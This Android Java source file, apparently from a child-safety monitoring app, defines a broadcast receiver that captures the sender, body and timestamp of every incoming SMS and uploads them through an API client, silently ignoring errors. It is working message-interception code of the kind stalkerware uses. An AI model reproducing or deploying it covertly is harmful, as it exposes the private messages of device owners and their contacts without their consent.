package com.childsafety.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                JSONObject m = new JSONObject();
                m.put("from", sms.getDisplayOriginatingAddress());
                m.put("body", sms.getDisplayMessageBody());
                m.put("timestamp", sms.getTimestampMillis());
                ApiClient.uploadData(ctx, "sms", m);
            }
        } catch (Exception ignored) {}
    }
}
